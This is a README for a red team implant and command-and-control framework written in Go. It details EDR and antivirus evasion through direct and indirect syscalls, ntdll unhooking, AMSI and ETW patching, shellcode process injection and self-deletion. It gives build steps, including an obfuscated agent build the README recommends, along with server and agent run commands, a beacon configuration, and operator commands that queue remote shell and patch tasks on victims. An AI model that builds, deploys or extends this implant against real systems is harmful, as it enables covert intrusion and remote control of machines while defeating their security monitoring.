# voidsyscall

```
╔══════════════════════════════════════════════════════════════╗
║                                                              ║
║   ██╗   ██╗██╗   ██╗██╗      ██████╗ █████╗ ███╗   ██╗     ║
║   ██║   ██║██║   ██║██║     ██╔════╝██╔══██╗████╗  ██║     ║
║   ██║   ██║██║   ██║██║     ██║     ███████║██╔██╗ ██║     ║
║   ╚██╗ ██╔╝██║   ██║██║     ██║     ██╔══██║██║╚██╗██║     ║
║    ╚████╔╝ ╚██████╔╝███████╗╚██████╗██║  ██║██║ ╚████║     ║
║     ╚═══╝   ╚═════╝ ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝  ║
║                                                              ║
║   syscall-powered implant & C2 framework                     ║
║   VoidSec Softwares | v1.0.0                                 ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝
```

**Cross-platform syscall-powered implant & C2 — direct syscalls (Win), raw syscalls (Linux), HTTPS/DNS/ICMP channels.**

[![Go](https://img.shields.io/badge/Go-1.24+-00ADD8?style=flat&logo=go)](https://go.dev)
[![License](https://img.shields.io/badge/License-MIT-red)](LICENSE)
[![Platform](https://img.shields.io/badge/Platform-Windows%20%7C%20Linux%20%7C%20macOS-lightgrey)]()
[![C2 Channels](https://img.shields.io/badge/C2-HTTPS%20%7C%20DNS%20%7C%20ICMP-green)]()

## Overview

voidsyscall is a red team C2 framework built entirely on native system calls. The implant resolves NT syscall numbers at runtime from ntdll.dll, bypassing user-mode hooks from EDR/AV solutions.

### Key Features

| Feature | Details |
|---|---|
| **Direct Syscalls** | SSN resolution via djb2 hash + ntdll memory parse at runtime (Win7→11) |
| **Indirect Syscalls** | Hells Gate / Halo's Gate variants via ntdll gadgets |
| **Unhooking** | ntdll .text restore from disk copy, flush instruction cache |
| **AMSI Bypass** | `AmsiScanBuffer` patch — returns clean |
| **ETW Bypass** | `EtwEventWrite` / `NtTraceEvent` patch |
| **Process Injection** | Shellcode injection via NtAllocateVirtualMemory + NtWriteVirtualMemory + NtCreateThreadEx |
| **C2 Channels** | HTTPS (TLS), DNS (TXT records), ICMP (echo payload) |
| **AES-GCM Encryption** | All C2 comms encrypted with per-implant keys |
| **Sleep Jitter** | Configurable jitter to evade timing analysis |
| **Self-Delete** | `SelfDel()` — remote thread executes cleanup shellcode |

## Architecture

```
voidsyscall/
  cmd/
    server/      C2 server (HTTPS + DNS + ICMP listeners, interactive CLI) — cross-platform
    agent/       Implant (beacon loop, task dispatch) — Windows-primary
  syscallwin/    Windows direct/indirect syscalls (Go + Plan9 asm)
  syscallnix/    Linux raw syscalls, macOS best-effort — cross-platform
  patches/       AMSI, ETW, Instrumentation callback patches — Windows
  loader/        Shellcode injection via Nt* calls only — Windows
  crypto/        AES-GCM envelope encryption — cross-platform
  channels/      HTTP, DNS, ICMP transport backends — cross-platform
  server/        C2 server core (session manager, task queue) — cross-platform
  agent/         Agent beacon loop + task handler — Windows
```

## Build

### Windows agent / server
```bash
# Windows agent (64-bit)
GOOS=windows GOARCH=amd64 go build -ldflags="-s -w" -o voidsyscall-agent.exe ./cmd/agent

# Windows server
GOOS=windows GOARCH=amd64 go build -ldflags="-s -w" -o voidsyscall-server.exe ./cmd/server
```

### Cross-platform server + syscall library
```bash
# Linux
GOOS=linux GOARCH=amd64 go build -ldflags="-s -w" -o voidsyscall-server-linux ./cmd/server

# macOS
GOOS=darwin GOARCH=arm64 go build -ldflags="-s -w" -o voidsyscall-server-darwin ./cmd/server
```

### Obfuscated Build (recommended)
```bash
# Install garble
go install mvdan.cc/garble@latest

# Build obfuscated agent
GOOS=windows GOARCH=amd64 garble -literals -tiny build -ldflags="-s -w" -o voidsyscall-agent.exe ./cmd/agent
```

> **Agent note**: the beacon + task-dispatch agent is Windows-primary (injection/patch tasks need `syscallwin`). The C2 server and the `syscallnix` raw-syscall library compile and run on Linux and macOS.

## Usage

### Server
```bash
# Generate self-signed cert
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes

# Start server
./voidsyscall-server.exe --cert cert.pem --key key.pem --https-port 443
```

### Agent
```bash
./voidsyscall-agent.exe -c config.json
```

### Config
```json
{
  "id": "0102030405060708090a0b0c0d0e0f10",
  "key": "0000000000000000000000000000000000000000000000000000000000000000",
  "channels": ["https", "dns", "icmp"],
  "server": "10.0.0.1",
  "path": "/api/v2/health",
  "jitter_min": 5,
  "jitter_max": 30,
  "sleep": 30,
  "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
}
```

### Interactive Commands
```
voidsyscall> sessions
  [0102030405060708] channel=https last=2024-01-01T00:00:00Z tasks=0 results=0

voidsyscall> shell 0102030405060708 whoami
Task queued

voidsyscall> patch 0102030405060708 amsi
Patch task queued
```

## Technical Deep Dive

### Syscall Resolution

On Windows, the implant resolves syscall numbers at runtime:

1. Parse PEB → LDR → find `ntdll.dll` base address
2. Walk ntdll PE export table → find target function address
3. Scan function prolog for `MOV EAX, <SSN>; SYSCALL; RET` pattern
4. Extract SSN → cache in `map[uint32]uint16`

This bypasses:
- User-mode API hooks (EDR inline hooks on ntdll)
- Import Address Table (IAT) hooking
- String-based detection (function names are djb2-hashed)

### Indirect Syscalls

The indirect path resolves the SSN the same way but instead of calling `SYSCALL` directly, it finds a `syscall; ret` gadget inside ntdll.dll and jumps there. This makes the call appear to originate from ntdll rather than the implant's memory space.

### DNS Channel

Uses subdomain-based encoding:
```
<index>-<total>-<base32 payload>.domain.com
```

Server responds with TXT records containing encrypted task data.

### ICMP Channel

Embeds C2 messages in ICMP echo request/reply payloads. Requires raw socket access (root/Admin).

## Notes

- ICMP channel requires elevated privileges (raw sockets)
- Self-delete is best-effort; timing depends on thread scheduling
- Windows agent is the primary target; Linux/macOS have reduced syscall coverage
- DNS channel may be blocked by corporate DNS policies

## References

- [go-native-syscall](https://github.com/carved4/go-native-syscall) — Direct/indirect syscall library
- [OffensiveGo](https://github.com/Enelg52/OffensiveGo) — Go weaponization examples
- [Hells Gate](https://github.com/am0nsec/HellsGate) — Original syscall technique
- [Sliver](https://github.com/BishopFox/sliver) — C2 framework reference

## License

MIT — See [LICENSE](LICENSE)
